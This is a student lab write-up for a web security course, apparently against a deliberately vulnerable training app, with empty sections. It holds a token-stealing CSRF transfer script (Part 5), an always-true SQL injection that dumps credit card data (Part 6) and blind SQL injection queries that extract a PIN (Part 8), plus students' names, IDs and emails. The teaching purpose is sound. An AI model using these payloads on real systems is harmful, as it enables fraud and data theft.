#Hayden Goodfellow, 1004068386, Hayden.Goodfellow@mail.utoronto.ca
#Joseph Sawaya, 1004760537, joseph.sawaya@mail.utoronto.ca

Part 1 Explanation:

Part 2 Explanation:

Part 3 Explanation:

Part 4 Explanation:

Part 5 Explanation:
The formatted attack I entered into the message field is:
<script>
	function read_one(){
		console.log("Reading one");
		var one = document.getElementById("one");
		var inbedded_doc = one.contentWindow.document;
		var form = inbedded_doc.getElementsByName("form")[0];
		// console.log("Type of form object: " + typeof(form));
		var token = form.token.value;
		console.log("Got token: " + token);
		add_token_to_two(token);
	}
	function add_token_to_two(token) {
		console.log("Adding token to two");
		var two = document.getElementById("two");
		two.src = "attack?Screen=1469770765&menu=900&transfer=5000" + "&token=" + token;
		console.log("Done adding token to two");
	}
</script>

<iframe id="one" src="attack?Screen=1469770765&menu=900&transfer=main" onload="read_one()" width="1" height="1"></iframe>

<iframe id="two" width="1" height="1"></iframe>

Part 6 Explanation:
In part 6 I entered this into the field to have it print all the credit card numbers: 
name' OR 'h' = 'h
Notice the missing closing '. This ' is provided by the query the server is already doing. Basically the server runs:
SELECT * FROM user_data WHERE last_name = 'name' OR 'h' = 'h'

This attack works since we have tricked the WHERE to be always true because 'h' = 'h' is always true 
and that is OR'd with the original comparison of last_name = 'name'.

Consequently, it will always print all of the data since the select statement is SELECT *.
The vulnerability we exploited was the server not using a prepared statement and instead performing the query 
directly with the user input. This vulnerability wouldn't have been an issue if they would have used a prepared statement.

Part 7 Explanation:

Part 8 Explanation:
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4000)
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4500)
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4900)
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4870)
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) < 4863)
101 AND ((SELECT pin FROM credit where cc_number=1234123412341234) = 4862)
